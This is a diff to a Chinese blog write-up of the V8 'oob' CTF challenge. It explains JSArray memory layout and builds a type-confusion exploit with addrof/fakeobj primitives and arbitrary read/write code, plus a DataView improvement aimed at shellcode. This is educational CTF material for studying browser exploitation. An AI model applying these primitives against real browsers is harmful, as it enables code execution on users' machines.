@@ -71,9 +71,72 @@ V8 中的 JS 对象结构基本符合下面描述：
 - prototype：对象的原型（如果有）
 - elements：对象元素的地址
 - length：长度
-- properties：属性, 存有map和length
+- properties：属性，存有map和length
 
-其中, elements 也是个对象（指向数组对象上方的指针），即 v8 先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的 elements 指向了存储元素内容的内存地址。
+其中，elements 也是个对象（指向数组对象具体内容的指针），即 v8 先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的 elements 指向了存储元素内容的内存地址。
+
+在**没有开启指针压缩**的情况下，对象的内存布局如下（可以结合下面的例题）：
+
+- 测试代码：
+
+```javascript
+let float_list = [4.3];
+%DebugPrint(float_list);
+```
+
+- 输出：
+
+```bash
+DebugPrint: 0x1c53f8e4f341: [JSArray]
+ - map: 0x1713bd502ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x0f9345bd1111 <JSArray[0]>
+ - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 1
+ - properties: 0x3155becc0c71 <FixedArray[0]> {
+    #length: 0x180e41d801a9 <AccessorInfo> (const accessor descriptor)
+ }
+ - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> {
+           0: 4.3
+ }
+```
+
+- gdb 中查看内存：
+
+```bash
+pwndbg> telescope 0x1c53f8e4f340
+00:0000│  0x1c53f8e4f340 —▸ 0x1713bd502ed9 ◂— 0x400003155becc01
+01:0008│  0x1c53f8e4f348 —▸ 0x3155becc0c71 ◂— 0x3155becc08
+02:0010│  0x1c53f8e4f350 —▸ 0x1c53f8e4f371 ◂— 0x3155becc14
+03:0018│  0x1c53f8e4f358 ◂— 0x100000000
+04:0020│  0x1c53f8e4f360 —▸ 0x3155becc5239 ◂— 0x200003155becc01
+05:0028│  0x1c53f8e4f368 —▸ 0xf9345be02e1 ◂— 0xc100003155becc5a
+06:0030│  0x1c53f8e4f370 —▸ 0x3155becc14f9 ◂— 0x3155becc01
+07:0038│  0x1c53f8e4f378 ◂— 0x100000000
+08:0040│  0x1c53f8e4f380 ◂— 0x4011333333333333
+```
+
+- 即对于 `FixedDoubleArray` 类型的对象，内存布局如下：
+
+```bash
++---------------------------+
+|          map              |
+|---------------------------|
+|        prototype          |
+|---------------------------|
+|        elements           |------+
+|---------------------------|      |
+|  length    |    retained  |      |
+|---------------------------|      |
+|          ...              |      |
+|          ...              |      |
+|---------------------------|      |
+|         map               | <----+
+|---------------------------|
+|         data              |
+|---------------------------|
+|          ...              |
++---------------------------+
+```
 
 ---
 
@@ -224,9 +287,9 @@ tools/dev/v8gen.py x64.release
 ninja -C out.gn/x64.release d8
 ```
 
-这里有一点需要注意的是, 我们现在编译的 debug 版本调用 obj.oob() 时会触发异常退出, 因此只能在 release 版本下进行利用, debug 版本下调试帮助理解 JavaScript 对象结构。
+这里有一点需要注意的是，我们现在编译的 debug 版本调用 `obj.oob()` 时会触发异常退出，因此只能在 release 版本下进行利用，debug 版本下调试帮助理解 JavaScript 对象结构。
 
-题目的漏洞点体现在 oob.diff 文件中，通过参数数量的不同分别提供了越界读和越界写的功能：
+题目的漏洞点体现在 `oob.diff` 文件中，通过参数数量的不同分别提供了越界读和越界写的功能：
 
 ```c
 // ... L33:
@@ -236,9 +299,9 @@ ninja -C out.gn/x64.release d8
 // ...
 ```
 
-即无论是读还是写, oob 方法都索引到了 `elements[length]` 的位置, 造成了数组越界漏洞。
+即无论是读还是写，oob 方法都索引到了 `elements[length]` 的位置，造成了数组越界漏洞。
 
-在具体利用时, 还是遵循着常规 pwn 题目的基本思路：
+在具体利用时，还是遵循着常规 pwn 题目的基本思路：
 
 ```
 漏洞
@@ -248,7 +311,7 @@ ninja -C out.gn/x64.release d8
                                                  -> shellcode || hook_hijacking
 ```
 
-先来看几个类型转换的辅助函数:
+先来看几个类型转换的辅助函数：
 
 ```javascript
 class Helpers {
@@ -308,128 +371,98 @@ class Helpers {
 }
 ```
 
-接下来是利用 oob() 实现类型混淆的思路:
+接下来是利用 oob() 实现类型混淆的思路：
 
 - 首先需要明白：JavaScript 中对于对象（[对象结构的复习](#对象结构)）的解析依赖于 `map`：map 指向 `<Map(PACKED_ELEMENTS)>` 时 elements 中元素就会按照 obj 来解析，其他类型同理；
 - 而 `oob()` 不带参数（`args.at<Object>(0)` 永远是 self），就可以输出 `elements[length]`，`oob(data)` 就可以在 `elements[length]` 写入 data；
 - array 的 elements 也是对象，在内存结构中，往往体现为：elements 紧挨着 array，即： ** `elements[length]` 的位置上就是 array 的 `map` ** ；
 - 因此可以考虑先读出 map，再在另一种 array 的 map 处写入，即实现了类型混淆。
 
-在**没有开启指针压缩**的情况下，对象的内存布局如下：
+这样一来，我们就可以开始考虑构造任意地址写了，思路如下：
 
-- 测试代码：
+- 首先，在 JavaScript 中浮点数在内存中是直接存储的，因此伪造 `float_array` 是比较合适的；
+- 目标是通过在 `evil_float_array` 这个对象的 `elements` 的基础上使用 `get_obj()` 函数构建假的`float_array`；
+- 如此一来，当访问到 `fake_array[0]` 的时候，实际上会根据其 map 设定的访问规则，最终访问到 `target_addr+10` 也是 `evil_float_array[2]` 的位置上。
+
+因此就可以构造出如下 poc：
 
 ```javascript
+let helper = new Helpers();
+
+console.log("STEP 0 - Leak maps with oob access.");
+
+let obj = {};
+let obj_list = [obj];
 let float_list = [4.3];
+
+%DebugPrint(obj_list);
 %DebugPrint(float_list);
+
+let obj_list_map = obj_list.oob();
+let float_list_map = float_list.oob();
+
+%SystemBreak();
+
+console.log("STEP 1 - Type confusion.");
+
+function get_addr(victim) {
+  obj_list[0] = victim;
+  obj_list.oob(float_list_map);
+  let res = helper.f64toi64(obj_list[0]) - 1n;
+  obj_list.oob(obj_list_map);
+  return res;
+}
+
+function get_obj(addr) {
+  float_list[0] = helper.i64tof64(addr | 1n);
+  float_list.oob(obj_list_map);
+  let res = float_list[0];
+  float_list.oob(float_list_map);
+  return res;
+}
+
+let evil_float_array = [
+  float_list_map,
+  helper.i64tof64(0n),
+  helper.i64tof64(0xdeadbeefn),
+  helper.i64tof64((0x80n << 32n) | 0n),
+  helper.i64tof64(0xdeadcafen),
+  helper.i64tof64(0x31337n),
+];
+
+let fake_array_addr = get_addr(evil_float_array);
+let fake_elements_addr = fake_array_addr + 0x30n;
+let fake_obj = get_obj(fake_elements_addr);
+
+%DebugPrint(evil_float_array);
+%DebugPrint(fake_obj);
+%SystemBreak();
 ```
 
-- 输出：
-
-```bash
-DebugPrint: 0x1c53f8e4f341: [JSArray]
- - map: 0x1713bd502ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
- - prototype: 0x0f9345bd1111 <JSArray[0]>
- - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
- - length: 1
- - properties: 0x3155becc0c71 <FixedArray[0]> {
-    #length: 0x180e41d801a9 <AccessorInfo> (const accessor descriptor)
- }
- - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> {
-           0: 4.3
- }
-```
-
-- gdb 中查看内存：
-
-```bash
-pwndbg> telescope 0x1c53f8e4f340
-00:0000│  0x1c53f8e4f340 —▸ 0x1713bd502ed9 ◂— 0x400003155becc01
-01:0008│  0x1c53f8e4f348 —▸ 0x3155becc0c71 ◂— 0x3155becc08
-02:0010│  0x1c53f8e4f350 —▸ 0x1c53f8e4f371 ◂— 0x3155becc14
-03:0018│  0x1c53f8e4f358 ◂— 0x100000000
-04:0020│  0x1c53f8e4f360 —▸ 0x3155becc5239 ◂— 0x200003155becc01
-05:0028│  0x1c53f8e4f368 —▸ 0xf9345be02e1 ◂— 0xc100003155becc5a
-06:0030│  0x1c53f8e4f370 —▸ 0x3155becc14f9 ◂— 0x3155becc01
-07:0038│  0x1c53f8e4f378 ◂— 0x100000000
-08:0040│  0x1c53f8e4f380 ◂— 0x4011333333333333
-```
-
-- 即对于 `FixedDoubleArray` 类型的对象，内存布局如下：
-
-```bash
-+---------------------------+
-|          map              |
-|---------------------------|
-|        prototype          |
-|---------------------------|
-|        elements           |------+
-|---------------------------|      |
-|  length    |    retained  |      |
-|---------------------------|      |
-|          ...              |      |
-|          ...              |      |
-|---------------------------|      |
-|         map               | <----+
-|---------------------------|
-|         data              |
-|---------------------------|
-|          ...              |
-+---------------------------+
-```
-
-这样一来, 我们就可以开始考虑构造任意地址写了, 思路如下:
-
-- 首先, 在 JavaScript 中浮点数在内存中是直接存储的, 因此伪造 `float_array` 是比较合适的;
-- 目标是通过在 `fake_float_array` 这个对象的 `elements` 的基础上使用 `get_obj()` 函数构建假的`float_array`
-- 如此一来, 当访问到`fake_array[0]`的时候, 实际上会根据其map设定的访问规则, 最终访问到`target_addr+10`也是`fake_float_array[2]`的位置上.
-
-测试代码如下:
+可以验证在输出 `fake_obj` 时显示为 `<JSArray[128]>` 类型，进一步就可以在 `fake_obj` 的基础上获得任意地址读写的能力：
 
 ```javascript
-// arbitary read and write
-function get_addr(target_obj) {
-  obj_list[0] = target_obj
-  obj_list.oob(float_map)
-  let res = f2i(obj_list[0]) - 1n
-  obj_list.oob(obj_map)
-  return res
-}
-function get_obj(target_addr) {
-  float_list[0] = i2f(target_addr + 1n)
-  float_list.oob(obj_map)
-  let res = float_list[0]
-  float_list.oob(float_map)
-  return res
+console.log("STEP 2 - Arbitary read and write with fake_obj.");
+
+function arb_write(addr, data) {
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
+  fake_obj[0] = helper.i64tof64(data);
+  console.log(
+    "[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr),
+  );
 }
 
-var fake_float_array = [float_map, i2f(0n), i2f(0xdeadbeefn), i2f(0x400000000n), 4.3, 4.3]
-var fake_array_addr = get_addr(fake_float_array)
-var fake_elements_addr = fake_array_addr - 0x30n
-var fake_obj = get_obj(fake_elements_addr)
-
-function arb_read(target_addr) {
-  fake_float_array[2] = i2f(target_addr - 0x10n + 1n)
-  let res = f2i(fake_obj[0])
-  console.log("[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res))
-  return res
+function arb_read(addr) {
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
+  return helper.f64toi64(fake_obj[0]);
 }
-function arb_write(target_addr, data) {
-  fake_float_array[2] = i2f(target_addr - 0x10n + 1n)
-  fake_obj[0] = i2f(data)
-  console.log("[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data))
-}
-
-// test_demos
-var a = [0.1, 0.2, 0.3, 1.0, 4.3]
-var test_addr = get_addr(a) - (0x18n % DebugPrint(a))
-arb_write(test_addr, 0xdeadbeefn)
-;(console.log(a[2]) % DebugPrint(a)) % SystemBreak()
 ```
 
-但是上面使用FloatArray进行写入的时候, 在目标地址高位是0x7f等情况下, 会出现低 [18](#References) 位被置零的现象, 可以通过DataView的利用来解决:
+但是上面使用 FloatArray 进行写入的时候，在目标地址高位是 0x7f 等情况下，会出现低 18 位被置零的现象，可以通过 DataView 的利用来解决：
 
-- DataView对象中的有如下指针关系: `DataView -> buffer -> backing_store -> 存储内容` , 即`backing_store`指针指向了DataView申请的Buffer真正的内存地址;
+- DataView 对象中的有如下指针关系：
+  - `DataView -> buffer -> backing_store -> 存储内容`；
+  - 即 `backing_store` 指针指向了 DataView 申请的 Buffer 真正的内存地址；
 
 改进如下:
 
@@ -498,3 +531,5 @@ function get_obj( target_addr ) {
     float_list.oob(obj_map);
     l
 ```
+
+[ref](https://cloud.tencent.com/developer/article/1764424)
